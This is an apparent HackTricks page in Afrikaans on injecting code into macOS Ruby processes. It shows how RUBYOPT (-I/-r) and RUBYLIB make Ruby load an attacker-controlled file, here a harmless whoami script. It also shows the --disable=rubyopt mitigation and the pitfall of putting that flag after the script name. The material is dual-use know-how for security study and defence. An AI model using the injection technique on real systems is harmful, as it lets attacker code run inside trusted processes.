# macOS Ruby Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## RUBYOPT

Ruby ontleed ondersteunde command-line switches uit die `RUBYOPT`-omgewingsveranderlike voordat dit ’n script uitvoer. Ruby verwerp code execution deur `-e` in `RUBYOPT`, maar `-I` kan ’n library-search directory voorafvoeg en `-r` kan ’n library vereis. ’n Proses wat Ruby met aanvaller-beheerde omgewingsveranderlikes begin, kan dus gedwing word om aanvaller-beheerde Ruby code te laai.<sup>[[1]](#references)</sup>

Skep `/tmp/inject.rb`:
```ruby:inject.rb
puts `whoami`
```
Skep ’n onskadelike Ruby-script, soos `hello.rb`:
```ruby:hello.rb
puts 'Hello, World!'
```
Voer dit uit met ’n beheerde `RUBYOPT`-waarde:
```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb
```
Om hierdie gedrag te deaktiveer, gee `--disable=rubyopt` (of `--disable-rubyopt`) **voor** die skripnaam deur:<sup>[[1]](#references)</sup>
```bash
RUBYOPT="-I/tmp -rinject" ruby --disable=rubyopt hello.rb
```
’n Opsie wat ná `hello.rb` geskryf word, word in `ARGV` aan die script deurgegee; dit deaktiveer nie Ruby se vroeëre verwerking van `RUBYOPT` nie.<sup>[[1]](#references)</sup>
```bash
# This still loads /tmp/inject.rb because --disable-rubyopt is an argument to hello.rb.
RUBYOPT="-I/tmp -rinject" ruby hello.rb --disable-rubyopt
```
## RUBYLIB

In plaas daarvan om die load-gids met `-I` binne `RUBYOPT` voor te voeg, voeg die afsonderlike `RUBYLIB`-omgewingsveranderlike gidse by Ruby se `$LOAD_PATH`. In kombinasie met `RUBYOPT=-r<module>` laai dit aanvallerkode sonder dat `-I` in `RUBYOPT` nodig is:<sup>[[1]](#references)</sup>
```bash
echo "puts \`whoami\`" > /tmp/inject.rb
RUBYLIB=/tmp RUBYOPT=-rinject ruby hello.rb
```
## References

- [1] [Ruby-dokumentasie - Ruby-opdragreëlopsies](https://ruby-doc.org/3.4/ruby/options_md.html)
{{#include ../../../banners/hacktricks-training.md}}
